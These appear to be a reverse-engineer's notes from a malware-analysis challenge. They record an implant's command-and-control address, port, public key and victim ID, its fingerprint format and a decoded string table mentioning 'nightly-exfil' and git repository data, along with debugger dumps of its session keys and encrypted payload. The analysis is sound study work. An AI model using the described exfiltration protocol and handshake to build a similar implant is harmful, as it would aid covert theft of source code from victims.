## Previous Task results: 

### IP

198.51.100.83

### PubKey

'7ÎýþÐÏçÓj÷v°Ø+.© ï\*·cfXÏ]î\`

### Version

1.3.1.3-XVT

### Port:

6666

## Notes on how the malware works:

##### *Victim Id we'll be using (from the `victim_id` file):*

58c80187-bba5-4fc4-b872-af14ed9694f0

+ The initial connection function is `cywbunaodtzjq("198.51.100.83", 6666)`
+ Plaintext output of `fingerprint` function should be like this: 
  + username=unknown,version=1.3.1.3-XVT,os=Linux,timestamp=`results of tv_sec`
    + *Script to find the os info [from IBM site](https://www.ibm.com/docs/en/zos/2.2.0?topic=functions-uname-display-current-operating-system-name):*
    + *Below is my modified version to work on the docker image*
  + From this discovery, it seems that the malware builds all the info and then attempts connection with the function `cywbunaodtzjq`

```
#define _POSIX_SOURCE
#include <sys/utsname.h>
#include <stdio.h>

int main() {
  struct utsname uts;

  if (uname(&uts) < 0)
    perror("uname() error");
  else {
    printf("Sysname:  %s\n", uts.sysname);
    printf("Nodename: %s\n", uts.nodename);
    printf("Release:  %s\n", uts.release);
    printf("Version:  %s\n", uts.version);
    printf("Machine:  %s\n", uts.machine);
  }
  return 0;
}

```

### All content from the text-mapping function `nxlqkwqfbgjnw`:

| stringID	  | Results 	|
| ----------- | ----------- |
| 1      	  | os |
| 2   		  | version|
| 3      	  | username |
| 4   		  | timestamp |
| 5      	  | unknown |
| 6   		  | /tmp/.gglock |
| 7      	  | usr/local/src/repo |
| 8   		  | pidof git |
| 9      	  | Commit:  |
| 10   		  | Author:  |
| 11      	  | Email:  |
| 12   		  | Time:  |
| 13      	  | No data available |
| 14   		  | ninja |
| 15      	  | %Y-%m-%d |
| 16   		  | nightly-exfil |
| 17      	  | 1.3.1.3-XVT |
| 18   		  | '7ÎýþÐÏçÓj÷v°Ø+.© ï\*·cfXÏ]î\` |
| 19      	  | 198.51.100.8 |

### `fp` pointer in the arguments from `kdovfwaafohzy` has the following data Base64 encoded:
*Timestamp changes value whenever called, of course*

```
username=unknown,version=1.3.1.3-XVT,os=Linux,timestamp=1633983216
```

### Data from connect function `mucytenzelakd` before entering the function `kdovfwaafohz`

```
result = -1
sock = 4
my_uuid = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7f9cc4232e10 "\n+Q\275\205jg\361\370\325*\377\364Kw\206"}, _M_string_length = 16, {
    _M_local_buf = "\020\000\000\000\000\000\000\000\303dW\264\333d؎", _M_allocated_capacity = 16}}
messages = {<std::_Vector_base<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > > >> = {
    _M_impl = {<std::allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > >> = {<__gnu_cxx::new_allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > >> = {<No data fields>}, <No data fields>}, <std::_Vector_base<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > > >::_Vector_impl_data> = {_M_start = 0x0, _M_finish = 0x0, _M_end_of_storage = 0x0}, <No data fields>}}, <No data fields>}
uploads = {<std::_Vector_base<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > > >> = {
    _M_impl = {<std::allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > >> = {<__gnu_cxx::new_allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > >> = {<No data fields>}, <No data fields>}, <std::_Vector_base<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > > >::_Vector_impl_data> = {_M_start = 0x0, _M_finish = 0x0, _M_end_of_storage = 0x0}, <No data fields>}}, <No data fields>}
ciphertexts = {<std::_Vector_base<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > > >> = {
    _M_impl = {<std::allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > >> = {<__gnu_cxx::new_allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > >> = {<No data fields>}, <No data fields>}, <std::_Vector_base<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > > >::_Vector_impl_data> = {_M_start = 0x0, _M_finish = 0x0, _M_end_of_storage = 0x0}, <No data fields>}}, <No data fields>}
ubuf = {sysname = "Linux", '\000' <repeats 59 times>, nodename = "5ca3880006ae", '\000' <repeats 52 times>,
  release = "5.10.16.3-microsoft-standard-WSL2", '\000' <repeats 31 times>, version = "#1 SMP Fri Apr 2 22:23:49 UTC 2021", '\000' <repeats 30 times>,
  machine = "x86_64", '\000' <repeats 58 times>, domainname = "localdomain", '\000' <repeats 53 times>}
tv = {tv_sec = 1633988747, tv_usec = 652973}
username = 0x7f9cc43d49b4 ""
version = 0x7f9cc43d4a14 ""
os = 0x7ffde37a7140 "Linux"
fp = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7f9cc3e94a90 "dXNlcm5hbWU9dW5rbm93bg==,dmVyc2lvbj0xLjMuMS4zLVhWVA==,b3M9TGludXg=,dGltZXN0YW1wPTE2MzM5ODg3NDc="}, _M_string_length = 95, {
    _M_local_buf = "_\000\000\000\000\000\000\000\320qz\343\375\177\000", _M_allocated_capacity = 95}}
session_key = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7f9cc455dd30 "ES\r|\352\247\r\251{\t\253\201\257k\374\252\332R|$\255\212\206W\233\037\361\350S\213\067\001"}, _M_string_length = 32, {
    _M_local_buf = " \000\000\000\000\000\000\000J\266Uy\004V\000", _M_allocated_capacity = 32}}
```


### Original data from the function `kdovfwaafohz` (which sends keys info) before the function that sends socket data `xxfbtgbhbhil`

```
result = -1
pubKey = 0x7ff6910189b4 "'7\316\375\376\320\317\347\323j\367v\260\330+.\203\251\240\357*\005\004\267cfX\317]\356\226`"
client_secret = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff6911a1d60 "rI\314f\227u\r\022I醓7?\346'\220@85\032\370-\352\237\355\351\270Dp\213\016"}, _M_string_length = 32, {
    _M_local_buf = " ", '\000' <repeats 14 times>, _M_allocated_capacity = 32}}
client_public = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff6911a1d90 "\352\b\271\067\070\002b|\004nx\232\317̤o=\333h\261\331T\272')¶\245\303\376\033["}, _M_string_length = 32, {
    _M_local_buf = " ", '\000' <repeats 14 times>, _M_allocated_capacity = 32}}
public_key = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff6911a1e20 "'7\316\375\376\320\317\347\323j\367v\260\330+.\203\251\240\357*\005\004\267cfX\317]\356\226`"}, _M_string_length = 32, {
    _M_local_buf = " ", '\000' <repeats 14 times>, _M_allocated_capacity = 32}}
nonce = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff690e76dd0 ";\235?vc?Jt\367\247׀I\221\342\f\261\211\217\062\312\025\256\211"}, _M_string_length = 24, {
    _M_local_buf = "\030", '\000' <repeats 14 times>, _M_allocated_capacity = 24}}
ciphertext = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff690e5cf20 "\204?\202\247A\251\030\314pł\306A\t\r\200N\375i\364\375\343\255쉥\220\066\315#CF%\322@,\211\247\207\266x\233\236ǚ\201\367\354梡!j&}\342sk\263\341A\224\316@\203C\371J\241\342f\002\221x\240p\037\265\277\307\345N9\335\071LfRp cl\025at8\377@\212\354\254!7\345\341\070\363\361;et"},
  _M_string_length = 111, {_M_local_buf = "o", '\000' <repeats 14 times>, _M_allocated_capacity = 111}}
bodyLen = 135
length_header = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ffdab661110 "x\212\207\375"}, _M_string_length = 4, {_M_local_buf = "x\212\207\375\000\000\000\000\220\020f\253\375\177\000",
    _M_allocated_capacity = 4253518456}}
payload = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff6911a1ea0 "\352\b\271\067\070\002b|\004nx\232\317̤o=\333h\261\331T\272')¶\245\303\376\033[x\212\207\375;\235?vc?Jt\367\247׀I\221\342\f\261\211\217\062\312\025\256\211\204?\202\247A\251\030\314pł\306A\t\r\200N\375i\364\375\343\255쉥\220\066\315#CF%\322@,\211\247\207\266x\233\236ǚ\201\367\354梡!j&}\342sk\263\341A\224\316@\203C\371J\241\342f\002\221x\240p\037\265\277\307\345N9\335\071LfRp cl\025at8\377@\212\354\254!7\345\341\070\363\361;et"},
  _M_string_length = 171, {_M_local_buf = "\253\000\000\000\000\000\000\000\r\352\022\221\366\177\000", _M_allocated_capacity = 171}}
```

### Translated octal (first to octal, then to ascii) version:

```
result = -1
pubKey = 0x7ff6910189b4 "'7ÎýþÐÏçÓj÷v°Ø+.© ï\*·cfXÏ]î\`"
client_secret = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff6911a1d60 "rIÌfu\rI醓7?æ'@85ø-êíé¸Dp"}, _M_string_length = 32, {
    _M_local_buf = " ", '\000' <repeats 14 times>, _M_allocated_capacity = 32}}
client_public = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff6911a1d90 "\352\b\271\067\070\002b|\004nx\232\317̤o=\333h\261\331T\272')¶\245\303\376\033["}, _M_string_length = 32, {
    _M_local_buf = " ", '\000' <repeats 14 times>, _M_allocated_capacity = 32}}
public_key = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff6911a1e20 "'7\316\375\376\320\317\347\323j\367v\260\330+.\203\251\240\357*\005\004\267cfX\317]\356\226`"}, _M_string_length = 32, {
    _M_local_buf = " ", '\000' <repeats 14 times>, _M_allocated_capacity = 32}}
nonce = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff690e76dd0 ";\235?vc?Jt\367\247׀I\221\342\f\261\211\217\062\312\025\256\211"}, _M_string_length = 24, {
    _M_local_buf = "\030", '\000' <repeats 14 times>, _M_allocated_capacity = 24}}
ciphertext = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff690e5cf20 "\204?\202\247A\251\030\314pł\306A\t\r\200N\375i\364\375\343\255쉥\220\066\315#CF%\322@,\211\247\207\266x\233\236ǚ\201\367\354梡!j&}\342sk\263\341A\224\316@\203C\371J\241\342f\002\221x\240p\037\265\277\307\345N9\335\071LfRp cl\025at8\377@\212\354\254!7\345\341\070\363\361;et"},
  _M_string_length = 111, {_M_local_buf = "o", '\000' <repeats 14 times>, _M_allocated_capacity = 111}}
bodyLen = 135
length_header = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ffdab661110 "x\212\207\375"}, _M_string_length = 4, {_M_local_buf = "x\212\207\375\000\000\000\000\220\020f\253\375\177\000",
    _M_allocated_capacity = 4253518456}}
payload = {static npos = 18446744073709551615,
  _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>},
    _M_p = 0x7ff6911a1ea0 "\352\b\271\067\070\002b|\004nx\232\317̤o=\333h\261\331T\272')¶\245\303\376\033[x\212\207\375;\235?vc?Jt\367\247׀I\221\342\f\261\211\217\062\312\025\256\211\204?\202\247A\251\030\314pł\306A\t\r\200N\375i\364\375\343\255쉥\220\066\315#CF%\322@,\211\247\207\266x\233\236ǚ\201\367\354梡!j&}\342sk\263\341A\224\316@\203C\371J\241\342f\002\221x\240p\037\265\277\307\345N9\335\071LfRp cl\025at8\377@\212\354\254!7\345\341\070\363\361;et"},
  _M_string_length = 171, {_M_local_buf = "\253\000\000\000\000\000\000\000\r\352\022\221\366\177\000", _M_allocated_capacity = 171}}
```

### Data from `buf` in the function sending data to the socket.  This was the first call where data related to the keys are sent (Initialization?)

#### Original Contents

```
P.\354\304g\254\rZG\032\230\335c\376\204\253\372;\366\320_s\231\332\032\335τ@\377~*\v\357\364\230\\^\264\367\177\354\373\023\273\360\025$\255\027t\023\317[!\366\036\303.\034\272\362\353#I\242\273\203\036\346\027W}\340\371\354\b\267:p\336\305\351aǦ/\006\303\t\020g6\001b\310-\366}ג\211\016\242\303\\K[\206\241k\224\344\272\370Ƕ6\312#\373\035\245\340\207\231\233Q.\303$\270\207\275p\313\317s_\234\350\275\065\300\224[\204m\022\256\263\241\315\060#\236\020\026\337\372\371w\334\344V:\021\071\062\373
```

#### Hexdump Version
```
0x50    0x2e    0xec    0xc4    0x67    0xac    0x0d    0x5a
0x47    0x1a    0x98    0xdd    0x63    0xfe    0x84    0xab
0xfa    0x3b    0xf6    0xd0    0x5f    0x73    0x99    0xda
0x1a    0xdd    0xcf    0x84    0x40    0xff    0x7e    0x2a
0x0b    0xef    0xf4    0x98    0x5c    0x5e    0xb4    0xf7
0x7f    0xec    0xfb    0x13    0xbb    0xf0    0x15    0x24
0xad    0x17    0x74    0x13    0xcf    0x5b    0x21    0xf6
0x1e    0xc3    0x2e    0x1c    0xba    0xf2    0xeb    0x23
0x49    0xa2    0xbb    0x83    0x1e    0xe6    0x17    0x57
0x7d    0xe0    0xf9    0xec    0x08    0xb7    0x3a    0x70
0xde    0xc5    0xe9    0x61    0xc7    0xa6    0x2f    0x06
0xc3    0x09    0x10    0x67    0x36    0x01    0x62    0xc8
0x2d    0xf6    0x7d    0xd7    0x92    0x89    0x0e    0xa2
0xc3    0x5c    0x4b    0x5b    0x86    0xa1    0x6b    0x94
0xe4    0xba    0xf8    0xc7    0xb6    0x36    0xca    0x23
0xfb    0x1d    0xa5    0xe0    0x87    0x99    0x9b    0x51
0x2e    0xc3    0x24    0xb8    0x87    0xbd    0x70    0xcb
0xcf    0x73    0x5f    0x9c    0xe8    0xbd    0x35    0xc0
0x94    0x5b    0x84    0x6d    0x12    0xae    0xb3    0xa1
0xcd    0x30    0x23    0x9e    0x10    0x16    0xdf    0xfa
0xf9    0x77    0xdc    0xe4    0x56    0x3a    0x11    0x39
0x32    0xfb    0xd2
```